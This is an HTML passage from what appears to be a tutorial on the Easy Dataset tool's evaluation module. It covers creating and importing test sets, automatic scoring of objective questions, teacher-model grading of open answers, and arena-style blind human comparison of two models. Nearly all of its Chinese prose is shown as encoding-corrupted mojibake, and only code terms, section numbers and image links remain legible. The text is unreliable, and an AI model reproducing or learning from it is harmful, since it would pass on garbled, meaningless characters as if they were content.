<p>é—®é¢˜ã€é€‰é¡¹ã€ç­”æ¡ˆéƒ½å¯ä»¥è‡ªç”±ç¼–è¾‘ï¼Œä½ ä¹Ÿå¯ä»¥å¯¹é¢˜ç›®è¿›è¡Œæ‰“æ ‡ç­¾ã€å¤‡æ³¨ã€åˆ é™¤ç­‰ç­‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/601f7268a08c4162aae0a03954caf8b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=Hf9S4DEsIANWf1C0%2BiI0p6OXJYQ%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-12">ä»æ•°æ®é›†æ·»åŠ </h4>
<p>åœ¨ä»¥å‰çš„é¡¹ç›®ä¸­ï¼Œä½ å¯èƒ½å·²ç»ä½¿ç”¨  <code>Easy Dataset</code> ç”Ÿæˆè¿‡æ•°æ®é›†ï¼ˆè®­ç»ƒé›†ï¼‰ï¼Œæˆ‘ä»¬ä¹Ÿæ”¯æŒç›´æ¥ä»å·²æœ‰æ•°æ®é›†ä¸Šæ ‡æ³¨å’Œç”Ÿæˆæµ‹è¯•é›†ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬æ¥åˆ°ã€æ•°æ®é›†-å•è®ºé—®ç­”æ•°æ®é›†ã€‘æ¨¡å—ï¼Œå¯ä»¥çœ‹åˆ°ä¹‹å‰ç”Ÿæˆè¿‡çš„æ•°æ®é›†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab7f5c6b253847b6b2cb2029e73953f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=LJXud%2BgUF6YYSgoBIKx0IUgW8W0%3D" alt="" loading="lazy"/></p>
<p>è¿›å…¥æ•°æ®é›†è¯¦æƒ…é¡µï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å½“å‰æ•°æ®é›†æ·»åŠ åˆ°è¯„ä¼°æ•°æ®é›†ï¼ˆæµ‹è¯•é›†ï¼‰ï¼ŒåŒæ—¶ï¼Œç³»ç»Ÿç»™åŸæ•°æ®é›†æ‰“ä¸Š Eval æ ‡ç­¾ï¼ˆç”¨äºåç»­ç­›é€‰/è¯†åˆ«ï¼‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a1bd7191b4e4847873538eca6f50a2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=I5M%2FqOumePsJevUG4CjelNgzbzs%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœè®­ç»ƒé›†å¤ªå°‘æˆ–å¤šæ ·æ€§ä¸è¶³ï¼Œæ¨¡å‹æœ‰æ—¶å€™ä¼š â€œæ­»è®°ç¡¬èƒŒâ€ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠä¸€é“ç°æœ‰çš„æ•°æ®é›†é¢˜ç›®è‡ªåŠ¨æ”¹å†™ç”Ÿæˆè¯„ä¼°é›†å˜ä½“ï¼ˆæ¯”å¦‚æ¢ä¸ªé—®æ³•ï¼Œæˆ–è€…æŠŠé€‰æ‹©é¢˜æ”¹æˆåˆ¤æ–­é¢˜ï¼‰ï¼Œçœ‹çœ‹æ¨¡å‹æ˜¯ä¸æ˜¯çœŸçš„ç†è§£äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9f4928ed4fd4edb9d152f49aa5321fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=R6N5K11DTLnLoc2Njz8ftdi%2Bb1M%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡»ï¼šã€ç”Ÿæˆè¯„ä¼°é›†å˜ä½“ã€‘å¯ä»¥é€‰æ‹©è¦ç”Ÿæˆçš„é¢˜ç›®ç±»å‹å’Œæ•°é‡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a87b5c66261343e592fe59438650a671~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=PqxrxZdqRpQRlrFuznt%2FVK0LUU4%3D" alt="" loading="lazy"/></p>
<p>åœ¨å¸¸è§„çš„æ€è·¯ä¸­ï¼Œä¸€èˆ¬æˆ‘ä»¬è¦ä»æ‰€æœ‰æ•°æ®é›†ä¸­åˆ’åˆ†å‡ºä¸€å®šæ¯”ä¾‹ï¼ˆå¦‚ 15%ï¼‰ä½œä¸ºæµ‹è¯•é›†ã€‚</p>
<p>ä½†æ˜¯ï¼Œåœ¨å°è§„æ¨¡çš„æ•°æ®é›†ä¸Šï¼Œå¦‚æœç›´æ¥åˆ’åˆ†å‡ºä¸€å®šæ¯”ä¾‹çš„æµ‹è¯•é›†å¯èƒ½ä¼šå¯¼è‡´åŸæœ‰çš„è®­ç»ƒé›†æ•°é‡å’Œå¤šæ ·æ€§ä¸è¶³ï¼Œå¯¼è‡´æ¨¡å‹è®­ç»ƒæ•ˆæœå·®ã€‚</p>
<p>å¦‚æœä½¿ç”¨ <code>Easy Dataset</code> ç”Ÿæˆçš„æ•°æ®é›†ï¼Œæˆ‘ä»¬å¯ä»¥å…¨éƒ¨ç”¨äºè®­ç»ƒé›†ï¼Œå¦å¤–ä¸€éƒ¨åˆ†æµ‹è¯•é›†æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ç°æœ‰çš„æ•°æ®é›†ä¸Šç”Ÿæˆå˜ä½“ï¼Œæˆ–é‡æ–°ä»æ–‡æœ¬å—æå–ã€‚è¿™æ ·æ—¢èƒ½ä¿è¯è®­ç»ƒé›†çš„å¤šæ ·æ€§ä¸ä¼šå—åˆ°æŸå¤±ï¼Œè¿˜èƒ½ä¿è¯æœ‰è¶³å¤Ÿä¸°å¯Œçš„æµ‹è¯•é›†æ¥æ”¯æ’‘æœ€ç»ˆæ¨¡å‹æ•ˆæœçš„è¯„ä¼°ã€‚</p>
<h4 data-id="heading-13">å¯¼å…¥å¯¼å‡ºæµ‹è¯•é›†</h4>
<p>å¦‚æœä½ å·²ç»æœ‰å‡†å¤‡å¥½çš„æµ‹è¯•é›†ï¼Œåªæ˜¯æƒ³ä½¿ç”¨ <code>Easy Dataset</code> æ¥åšè¯„ä¼°ä»»åŠ¡ï¼Œå¯ä»¥åˆ°ã€è¯„ä¼°-è¯„ä¼°æ•°æ®é›†ã€‘æ¨¡å—ç›´æ¥è¿›è¡Œå¯¼å…¥ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d4720bd8e1f49efa79e7083ab1308ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=0ehA3YwrkJQbLbq9AfqSn%2F5lZDc%3D" alt="" loading="lazy"/></p>
<p>ç›®å‰æ”¯æŒä» <code>JSONã€XLSã€XLSX</code> å‡ ç§ç±»å‹çš„æ–‡ä»¶è¿›è¡Œå¯¼å…¥ï¼Œéœ€è¦å°†æ–‡ä»¶å¤„ç†æˆè§„å®šæ ¼å¼ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f3e3893fc554dfb841e3f596d8e6df0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=u4oHme5Z%2F9txz78y9w9xjCy7jaU%3D" alt="" loading="lazy"/></p>
<p>ä½ å¯ä»¥ç›´æ¥ä¸‹è½½å¯¹åº”é¢˜å‹å’Œæ–‡ä»¶ç±»å‹çš„æ¨¡ç‰ˆï¼Œç„¶åæŒ‰ç…§æ¨¡ç‰ˆè¿›è¡Œè¡¥å……ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae275ad3b906470f8c1d009669ebe36e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=cfRU9Wjt8%2Fys8hAua367%2F9GwvpM%3D" alt="" loading="lazy"/></p>
<p>å¦å¤–ï¼Œå¹³å°è¿˜å†…ç½®äº†ä¸°å¯Œçš„é¢†åŸŸçŸ¥è¯†æ•°æ®é›†ï¼Œå¦‚æœä½ æƒ³æµ‹è¯•æ¨¡å‹åœ¨ç‰¹å®šé¢†åŸŸä¸‹çš„è¡¨ç°ï¼Œå¯ä»¥ç›´æ¥é€‰æ‹©ã€å¯¼å…¥å†…ç½®æ•°æ®é›†ã€‘å¹¶é€‰æ‹©å¯¹åº”å­¦ç§‘è¿›è¡Œå¯¼å…¥ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32778826ddc7415c948c69d6575eaa48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=mf%2FVaB8vUlPXhk2iEzwLFYTaslo%3D" alt="" loading="lazy"/></p>
<p>æ¯ä¸ªå­¦ç§‘ä¸‹éƒ½å†…ç½®äº†å‡ ç™¾é“ä¸åŒéš¾åº¦çš„é¢˜ç›®ï¼ˆå¤§éƒ¨åˆ†ä¸ºå•é€‰æˆ–å¤šé€‰é¢˜ï¼‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c96570a3a764814bbcb3e1006e6e5f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=0Bfp%2BsL2g5Qpjy%2Fqi%2FgnyK07CoE%3D" alt="" loading="lazy"/></p>
<p>æµ‹è¯•é›†å¤„ç†å®Œæˆåï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è¿›è¡Œå¯¼å‡ºï¼ˆæ”¯æŒè‡ªå®šä¹‰å¯¼å‡ºèŒƒå›´å’Œæ ¼å¼ï¼‰ï¼Œä½ å¯ç”¨äºå…¶ä»–è¯„ä¼°ç³»ç»Ÿï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e1d4e7954c943acb85bb527b8db94f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=2IRLLCEVB1fWrD9yo2yqDAxIhn4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">2. æ€ä¹ˆæ‰“åˆ†ï¼Ÿï¼ˆè‡ªåŠ¨è¯„ä¼°ä»»åŠ¡ï¼‰</h3>
<p>é¢˜å‡ºå¥½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è®©ä¸šåŠ¡æ¨¡å‹æ¥åšé¢˜ï¼Œç³»ç»Ÿæ¥åˆ¤å·ã€‚ç³»ç»Ÿæ”¯æŒä¸¤ç§é˜…å·æ¨¡å¼ï¼š</p>
<h4 data-id="heading-15">æ¨¡å¼ä¸€ï¼šç›´æ¥è®¡ç®—å¾—åˆ†ï¼ˆé’ˆå¯¹å®¢è§‚é¢˜ï¼‰</h4>
<p>å¯¹äº<strong>åˆ¤æ–­é¢˜ã€å•é€‰é¢˜ã€å¤šé€‰é¢˜</strong>ï¼Œç­”æ¡ˆæ˜¯å”¯ä¸€çš„ã€‚
ç³»ç»Ÿä¸éœ€è¦è°ƒç”¨å¤§æ¨¡å‹ï¼Œç›´æ¥ç”¨è§„åˆ™ä»£ç æ¯”å¯¹ã€‚</p>
<p>æˆ‘ä»¬æ¥åˆ°ã€è¯„ä¼°-è‡ªåŠ¨è¯„ä¼°ä»»åŠ¡ã€‘æ¨¡å—ï¼Œç‚¹å‡»åˆ›å»ºä»»åŠ¡ï¼Œæ‚¨å¯ä»¥åŒæ—¶å‹¾é€‰å¤šä¸ªæ¨¡å‹ï¼Œç³»ç»Ÿä¼šå¹¶å‘æ‰§è¡Œå¤šä¸ªä»»åŠ¡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/418f1e4b15ad41268dca5088351da9ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=FBUHmgA%2BuhuPNmxqtBLDSfesKZE%3D" alt="" loading="lazy"/></p>
<p>å°±åƒè¦çœŸå®è¦å¯¹æ¨¡å‹è¿›è¡Œä¸€åœºè€ƒè¯•ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥é…ç½®æœ¬æ¬¡ â€œè€ƒå·â€ çš„å…·ä½“é¢˜ç›®èŒƒå›´ï¼š</p>
<ul>
<li><strong>é¢˜å‹ç­›é€‰</strong>ï¼šæ¯”å¦‚æœ¬æ¬¡ä¹‹è€ƒå¯Ÿé€‰æ‹©é¢˜å’Œåˆ¤æ–­é¢˜ã€‚</li>
<li><strong>æ ‡ç­¾ç­›é€‰</strong>ï¼šæ¯”å¦‚åªè€ƒæŸ¥æ ‡ç­¾ä¸º <code>åŒ»ç–—çŸ¥è¯†</code> çš„é¢˜ç›®ã€‚</li>
<li><strong>åŠ¨æ€é‡‡æ ·</strong>ï¼šå¦‚æœæ‚¨æƒ³å¿«é€Ÿè·å¾—ç»“æœï¼Œå¯ä»¥ä» 1000 é“é¢˜ä¸­éšæœºæŠ½æ · 50 é“ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce8d7497beb740cb8abd475537c55ccc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=u32ZtfMpZDNW0I7OBrxbQEMK%2FEU%3D" alt="ä»»åŠ¡æ‰§è¡Œä¸­" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79a68f82299141ab9ec1e4d50eec1351~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=yfhUR2HJIY9Kgh70hzDlmJt792o%3D" alt="ä»»åŠ¡æ‰§è¡Œå®Œæˆ" loading="lazy"/></p>
<p>è¿›å…¥è¯„ä¼°ä»»åŠ¡è¯¦æƒ…ï¼Œä½ å¯ä»¥çœ‹åˆ°æ¨¡å‹åœ¨ä¸åŒé¢˜ç›®ä¸Šçš„å…·ä½“å¾—åˆ†æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®é¢˜ç›®å›ç­”ç»“æœï¼ˆæ­£ç¡®/é”™è¯¯ï¼‰ä»¥åŠé¢˜ç›®ç±»å‹ï¼ˆåˆ¤æ–­ã€å•é€‰ã€å¤šé€‰ï¼‰è¿›è¡Œç­›é€‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56629816f35b4a5ba2b001c4ebafb7fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=gIGcBjTtGGN%2BVQbVvcVKjEPFdOI%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-16">æ¨¡å¼äºŒï¼šæ•™å¸ˆæ¨¡å‹è¯„ä¼°ï¼ˆé’ˆå¯¹ä¸»è§‚é¢˜ï¼‰</h4>
<p>å¯¹äºå®¢è§‚é¢˜ï¼ˆé€‰æ‹©ã€åˆ¤æ–­ï¼‰ï¼Œç³»ç»Ÿå¯ä»¥è‡ªåŠ¨å¯¹é½ç­”æ¡ˆã€‚ä½†å¯¹äº <strong>ç®€ç­”é¢˜</strong> å’Œ <strong>å¼€æ”¾é¢˜</strong>ï¼Œç­”æ¡ˆå¾€å¾€æ˜¯å¤šæ ·åŒ–çš„ã€‚æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸€ä¸ªæ›´æ™ºæ…§çš„ â€œæ•™å¸ˆæ¨¡å‹â€ï¼ˆå°±åƒåˆ¤æ–­è€å¸ˆä¸€æ ·ï¼‰ å¯¹æµ‹è¯•æ¨¡å‹çš„å›ç­”è¿›è¡Œæ·±åº¦è¯„æµ‹ï¼Œç»™å‡ºé‡åŒ–çš„åˆ†æ•°å’Œå®šæ€§çš„è¯„è¯­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/312f4c8f116a4654905c19c10b0815fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=OCdaAlZ8CKyD6e7nMESfw84k%2BNM%3D" alt="" loading="lazy"/></p>
<p>ç³»ç»Ÿå†…ç½®äº†ä¸€ä»½è¯„åˆ†æ ‡å‡†ï¼Œä¸è¿‡é€šç”¨çš„æ ‡å‡†æ¯”è¾ƒå®½æ³›ï¼Œä¸ä¸€å®šé€‚ç”¨äºæ‰€æœ‰åœºæ™¯ï¼Œå¦‚æœä½ æƒ³å¾—åˆ°æ›´å‡†ç¡®çš„è¯„ä¼°ç»“æœï¼Œå»ºè®®æ ¹æ®å®é™…ä¸šåŠ¡åœºæ™¯å’Œæ•°æ®é›†çš„ç‰¹ç‚¹å®šåˆ¶å…·ä½“çš„è¯„åˆ†è§„åˆ™ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b274baae7064d57a18e11eb36f81fb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=QCPVvyQRBoNCkhzbr%2FA2%2Bjd6D6g%3D" alt="" loading="lazy"/></p>
<p>åœ¨è¯„ä¼°æŠ¥å‘Šè¯¦æƒ…ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°æ¯ä¸ªé¢˜ç›®çš„å…·ä½“å¾—åˆ†ï¼Œæ•™å¸ˆæ¨¡å‹çš„æ‰“åˆ†ä»¥åŠå…·ä½“çš„æ‰“åˆ†ç†ç”±ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33f31315d0414e32893fa59a1c7ff815~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=mKF70N1TjWPegx%2FTDVEotWOAxEI%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>å»ºè®®ï¼š</p>
<ul>
<li>åŒä¸€å¥—è¯„ä¼°é•¿æœŸå¯¹æ¯”æ—¶ï¼Œå°½é‡å›ºå®šæ•™å¸ˆæ¨¡å‹ä¸è¯„åˆ†é…ç½®ï¼Œå¦åˆ™åˆ†æ•°ä¸å¯ç›´æ¥æ¨ªå‘å¯¹æ¯”</li>
<li>å…ˆåœ¨å°æ ·æœ¬ï¼ˆå¦‚ 20 é¢˜ï¼‰è·‘é€šï¼Œç¡®è®¤è£åˆ¤æ ‡å‡†ç¬¦åˆé¢„æœŸï¼Œå†æ‰©å¤§è§„æ¨¡</li>
</ul>
</blockquote>
<h3 data-id="heading-17">3. äººå·¥ç›²æµ‹ï¼šå›å½’çœŸå®ç›´è§‰çš„ â€œç«æŠ€åœºâ€</h3>
<p>è™½ç„¶è‡ªåŠ¨åŒ–è¯„ä¼°å¾ˆæ–¹ä¾¿ï¼Œä½†åœ¨æ¨¡å‹ä¸Šçº¿çš„æœ€åé˜¶æ®µï¼Œæˆ–è€…ä¸¤ä¸ªæ¨¡å‹åˆ†æ•°å’¬å¾—å¾ˆæ­»çš„æ—¶å€™ï¼Œè¿˜æ˜¯éœ€è¦äººæ¥çœ‹ä¸€çœ¼ã€‚</p>
<blockquote>
<p><strong>ç›²æµ‹ä»»åŠ¡æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li>ç›²æµ‹ä»»åŠ¡ = æŠŠå¤šä¸ªæ¨¡å‹çš„å›ç­”â€œåŒ¿ååŒ–â€ï¼Œè®©è¯„å®¡è€…åªçœ‹å›ç­”è´¨é‡åšé€‰æ‹©/æ‰“åˆ†</li>
<li>é€‚åˆï¼š
<ul>
<li>ä½ å¸Œæœ›æ’é™¤â€œæ¨¡å‹ååè§â€</li>
<li>ä½ æ›´åœ¨æ„ä¸»è§‚ä½“éªŒï¼ˆå¯è¯»æ€§ã€é£æ ¼ã€è¯´æœåŠ›ã€å®Œæ•´æ€§ç­‰ï¼‰</li>
<li>å¼€æ”¾é¢˜/å¯¹è¯å‹å†…å®¹çš„æœ€ç»ˆè´¨é‡è¯„ä¼°</li>
</ul>
</li>
</ul>
</blockquote>
<p>å°±åƒåœ¨ä¸Šä¸ªç« èŠ‚ä¸­æˆ‘ä»¬è®²åˆ°åˆ° <code>LMArena</code>ï¼Œäººå·¥ç›²æµ‹å¯¹äºå‚ç›´é¢†åŸŸçš„æ¨¡å‹è¯„ä¼°åŒç­‰é‡è¦ï¼Œåœ¨å®é™…æµ‹è¯•ä¸­ï¼Œç³»ç»Ÿä¼šéšè—ä¸¤ä¸ªæ¨¡å‹çš„å›ç­”ç»“æœï¼Œè¯„åˆ¤è€…ä»…æ ¹æ®å›ç­”çš„è´¨é‡ã€é€»è¾‘ã€è¯­æ°”è¿›è¡Œä¸»è§‚åˆ¤æ–­ï¼Œå½»åº•æ¶ˆé™¤å¯¹ç‰¹å®šå“ç‰Œçš„å›ºæœ‰åè§ã€‚</p>
<p>æˆ‘ä»¬æ¥åˆ°ã€è¯„ä¼°-äººå·¥ç›²æµ‹ä»»åŠ¡ã€‘æ¨¡å—ï¼Œç„¶åç‚¹å‡»åˆ›å»ºä»»åŠ¡ï¼Œç„¶åé…ç½®ï¼š</p>
<ul>
<li><strong>ä¸¤ä¸¤å¯¹æ¯”</strong>ï¼šä»æ¨¡å‹åº“ä¸­é€‰æ‹©ä¸¤ä¸ªä½ æœ€æƒ³å¯¹æ¯”çš„æ¨¡å‹ã€‚</li>
<li><strong>é¢˜ç›®èŒƒå›´</strong>ï¼šé€‰æ‹©ç®€ç­”é¢˜æˆ–å¼€æ”¾é¢˜å¹¶è®¾ç½®æŠ½æ ·æ•°é‡ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a285420962c456898a224517afe4637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=Ygmq4EgT76Cfelwmy0nE6bLzip4%3D" alt="" loading="lazy"/></p>
<p>ä»»åŠ¡å¼€å¯åï¼Œæ‚¨å°†è¿›å…¥ä¸€ä¸ªç±»ä¼¼ <strong>Chatbot Arena</strong> çš„æ²‰æµ¸å¼çš„å¯¹æ¯”ç•Œé¢ï¼š</p>
<ul>
<li><strong>å·¦å³å¯¹ç…§</strong>ï¼šå·¦è¾¹å±•ç¤ºå€™é€‰ A çš„å›ç­”ï¼Œå³è¾¹å±•ç¤ºå€™é€‰ B çš„å›ç­”ï¼Œä½†ä¸å‘Šè¯‰æ ‡æ³¨äººå‘˜å…·ä½“æ˜¯å“ªä¸ªæ¨¡å‹ã€‚</li>
<li><strong>æµå¼åŠ è½½</strong>ï¼šç³»ç»Ÿæ”¯æŒæµå¼è¾“å‡ºï¼Œæ‚¨å¯ä»¥å®æ—¶çœ‹åˆ°æ¨¡å‹çš„ç”Ÿæˆè¿‡ç¨‹ã€‚</li>
<li><strong>å››é€‰ä¸€æŠ•ç¥¨</strong>ï¼šæ ‡æ³¨äººå‘˜åªéœ€è¦æ ¹æ®ç›´è§‚æ„Ÿå—ï¼Œé€‰æ‹©â€œå·¦è¾¹å¥½â€ã€â€œå³è¾¹å¥½â€æˆ–è€…â€œå¹³å±€â€ã€‚
<ul>
<li><strong>ğŸ‘ˆ å·¦è¾¹æ›´å¥½</strong>ï¼šå·¦ä¾§å›ç­”åœ¨å‡†ç¡®æ€§ã€æµç•…åº¦æˆ–å®‰å…¨æ€§ä¸Šæ›´ä¼˜ã€‚</li>
<li><strong>ğŸ‘‰ å³è¾¹æ›´å¥½</strong>ï¼šå³ä¾§å›ç­”æ›´ç¬¦åˆä½ çš„é¢„æœŸã€‚</li>
<li><strong>ğŸ¤ å¹³å±€</strong>ï¼šä¸¤è€…éš¾åˆ†ä¼¯ä»²ï¼Œæˆ–éƒ½å­˜åœ¨æ˜æ˜¾çš„ä¸¥é‡é”™è¯¯ã€‚</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c547fb0ce7b34e45ac5571c2f5826283~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=6aBpZxSeH7kH%2Fi1vWAktb6DMMi8%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>è¿™ç§ Side-by-Side çš„æ¯”è¾ƒæ•°æ®ï¼Œæ˜¯ç›®å‰å…¬è®¤æœ€ç¬¦åˆäººç±»çœŸå®ä½“æ„Ÿçš„è¯„ä¼°æ–¹å¼ã€‚</p>
</blockquote>
<p>å½“æ‰€æœ‰é¢˜ç›®æŠ•ç¥¨å®Œæˆåï¼Œç³»ç»Ÿä¼š â€œæ­æ™“è°œåº•â€ å¹¶ç”Ÿæˆèƒœç‡ç»Ÿè®¡ï¼Œç³»ç»Ÿå°†å±•ç¤ºæ¯ä¸ªæ¨¡å‹åœ¨å¯¹æ¯”ä¸­è·èƒœçš„ç™¾åˆ†æ¯”ã€‚å¦‚æœå¹³å±€è¾ƒå¤šï¼Œè¯´æ˜è¿™ä¸¤ä¸ªæ¨¡å‹åœ¨å½“å‰é¢˜åº“ä¸‹çš„è¡¨ç°éå¸¸æ¥è¿‘ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b4b6f87ce4a4acca5c93370e4df418d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=2uiIcrN1RBn6zCHf%2F5pRAChldf4%3D" alt="" loading="lazy"/></p>
<p>ä½ è¿˜å¯ä»¥å›é¡¾å…·ä½“æŸä¸ªé¢˜ç›®çš„å›ç­”ç»“æœï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79e1b67cd96f458bbc4ed348d89b88b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=oT6dZMGZXMmUw9quD6UhvERQEwU%3D" alt="" loading="lazy"/></p>
<p>å›åˆ°ä»»åŠ¡åˆ—è¡¨ï¼Œæˆ‘ä»¬èƒ½æ¸…æ™°çš„çœ‹åˆ°æ¯æ¬¡ç›²æµ‹ä»»åŠ¡çš„ç»“æœï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30fb91c3cdd6477eb1d8d691a0c16ed5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=J0vetIzt7%2BzZFpsfpWkmeqe0Lx8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-18">4. é«˜çº§ç”¨æ³•ï¼šè‡ªå®šä¹‰è¯„ä¼°</h3>
